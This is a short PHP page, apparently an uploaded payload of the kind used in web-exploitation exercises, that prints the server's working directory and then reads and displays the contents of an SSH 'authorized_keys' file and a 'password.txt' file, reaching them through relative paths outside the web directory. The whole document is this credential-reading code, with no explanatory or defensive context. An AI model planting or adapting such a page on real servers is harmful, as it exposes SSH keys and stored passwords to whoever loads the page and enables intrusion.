<html>
<body>
<?php

echo "<p>working dir: " . getcwd();
$ssh_dir = "../../.ssh";
$myFile = $ssh_dir . "/authorized_keys";
$contents = file_get_contents($myFile);
print "<p>contents: $contents";
echo "<p>";
$contents = file_get_contents("../password.txt");
echo "this is the contents: $contents";

?>
</body>
</html>
